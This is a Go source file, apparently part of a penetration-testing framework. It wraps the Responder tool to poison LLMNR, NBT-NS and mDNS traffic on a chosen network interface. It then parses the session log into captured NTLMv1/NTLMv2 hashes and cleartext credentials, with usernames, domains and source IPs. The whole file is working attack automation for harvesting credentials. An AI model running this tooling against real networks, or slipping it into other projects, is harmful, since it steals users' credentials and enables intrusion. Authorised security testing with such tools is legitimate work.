package fusion

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime/debug"
	"strings"
	"sync"
	"time"
)

// CapturedHash represents a single authentication hash captured by
// Responder from an LLMNR, NBT-NS, or mDNS poison.
type CapturedHash struct {
	Type     string `json:"type"` // NTLMv1, NTLMv2, ClearText
	Username string `json:"username"`
	Domain   string `json:"domain"`
	Hash     string `json:"hash"`
	SourceIP string `json:"source_ip"`
}

// Responder wraps the Responder binary for LLMNR/NBT-NS/mDNS poisoning.
// It manages the lifecycle of a capture session including starting,
// monitoring, and stopping the underlying process.
type Responder struct {
	binPath    string
	iface      string
	timeout    time.Duration
	cmd        *exec.Cmd
	sessionLog string
	mu         sync.Mutex
	running    bool
}

// NewResponder creates a new Responder using the supplied binary and
// network interface name. The interface must be specified for Responder
// to bind to the correct network.
func NewResponder(binPath, iface string) *Responder {
	return &Responder{
		binPath: binPath,
		iface:   iface,
		timeout: 5 * time.Minute,
	}
}

// StartCapture launches Responder in the background, binding to the
// configured interface and writing capture output to a session log.
func (r *Responder) StartCapture() error {
	r.mu.Lock()
	defer r.mu.Unlock()

	if r.running {
		return fmt.Errorf("responder: capture already running on interface %s", r.iface)
	}

	logDir := filepath.Join(os.TempDir(), "fortress-responder")
	if err := os.MkdirAll(logDir, 0o755); err != nil {
		return fmt.Errorf("responder: create log dir: %w", err)
	}

	r.sessionLog = filepath.Join(logDir,
		fmt.Sprintf("responder-%d.log", time.Now().Unix()))

	r.cmd = exec.Command(r.binPath,
		"-I", r.iface,
		"-wF",
		"-l", r.sessionLog,
	)

	// Start asynchronously — we don't wait for the process to finish.
	if err := r.cmd.Start(); err != nil {
		return fmt.Errorf("responder: start capture: %w", err)
	}

	r.running = true
	log.Printf("[responder] capture started on %s, log: %s", r.iface, r.sessionLog)

	// Launch a goroutine to wait for process exit and update running state.
	go func() {
		defer func() {
			if r := recover(); r != nil {
				log.Printf("[responder] wait panic: %v\nstack: %s", r, debug.Stack())
			}
		}()
		if err := r.cmd.Wait(); err != nil {
			log.Printf("[responder] capture exited: %v", err)
		}
		r.mu.Lock()
		r.running = false
		r.mu.Unlock()
	}()

	return nil
}

// StopCapture terminates a running Responder capture session and returns
// any captured hashes parsed from the session log.
func (r *Responder) StopCapture() ([]CapturedHash, error) {
	r.mu.Lock()
	defer r.mu.Unlock()

	if !r.running || r.cmd == nil || r.cmd.Process == nil {
		return nil, fmt.Errorf("responder: no capture running")
	}

	if err := r.cmd.Process.Kill(); err != nil {
		log.Printf("[responder] kill error: %v", err)
	}

	r.running = false

	hashes, err := ParseResponderLog(r.sessionLog)
	if err != nil {
		return hashes, fmt.Errorf("responder: parse log: %w", err)
	}

	return hashes, nil
}

// IsRunning reports whether Responder is currently capturing traffic.
func (r *Responder) IsRunning() bool {
	r.mu.Lock()
	defer r.mu.Unlock()
	return r.running
}

// GetSessionLog returns the path to the current session log file.
func (r *Responder) GetSessionLog() string {
	r.mu.Lock()
	defer r.mu.Unlock()
	return r.sessionLog
}

// ParseResponderLog reads a Responder session log and extracts captured
// hashes into structured entries.
func ParseResponderLog(logPath string) ([]CapturedHash, error) {
	f, err := os.Open(logPath)
	if err != nil {
		if os.IsNotExist(err) {
			return nil, fmt.Errorf("responder: log file not found: %s", logPath)
		}
		return nil, fmt.Errorf("responder: open log: %w", err)
	}
	defer f.Close()

	var hashes []CapturedHash
	scanner := bufio.NewScanner(f)

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}

		entry := parseResponderLine(line)
		if entry.Hash != "" {
			hashes = append(hashes, entry)
		}
	}

	if err := scanner.Err(); err != nil {
		return hashes, fmt.Errorf("responder: scan log: %w", err)
	}

	return hashes, nil
}

// parseResponderLine attempts to extract a captured hash from a single
// line of Responder log output. Returns an empty CapturedHash if the
// line does not contain a recognizable hash format.
func parseResponderLine(line string) CapturedHash {
	entry := CapturedHash{}

	// Responder output format varies by protocol. Look for known markers.
	switch {
	case strings.Contains(line, "NTLMv2-SSP Hash"):
		entry.Type = "NTLMv2"
	case strings.Contains(line, "NTLMv1-SSP Hash"):
		entry.Type = "NTLMv1"
	case strings.Contains(line, "ClearText"):
		entry.Type = "ClearText"
	default:
		// Not a hash line — look for embedded hash patterns.
		if !strings.Contains(line, ":") || !strings.Contains(line, "::") {
			return entry
		}
		entry.Type = "NTLMv2" // default assumption
	}

	// Extract hash portion: the last quoted or colon-delimited segment.
	// Typical format: user::domain:challenge:HMAC-MD5:blob
	parts := strings.Fields(line)
	for _, part := range parts {
		if strings.Count(part, ":") >= 4 {
			entry.Hash = part
			break
		}
	}

	// Try to extract username from the format "Username: DOMAIN\user".
	if idx := strings.Index(line, ":"); idx > 0 && idx < len(line)-1 {
		// Check ahead for domain\user pattern
		prefix := strings.TrimSpace(line[:idx])
		if strings.Contains(prefix, "\\") {
			domainUser := strings.SplitN(prefix, "\\", 2)
			entry.Domain = domainUser[0]
			entry.Username = domainUser[1]
		} else if strings.Contains(prefix, "/") {
			domainUser := strings.SplitN(prefix, "/", 2)
			entry.Domain = domainUser[0]
			entry.Username = domainUser[1]
		}
	}

	// Extract source IP if present in the line.
	for _, word := range parts {
		// Simple IPv4 heuristic.
		if strings.Count(word, ".") == 3 && len(word) <= 15 {
			entry.SourceIP = word
			break
		}
	}

	return entry
}
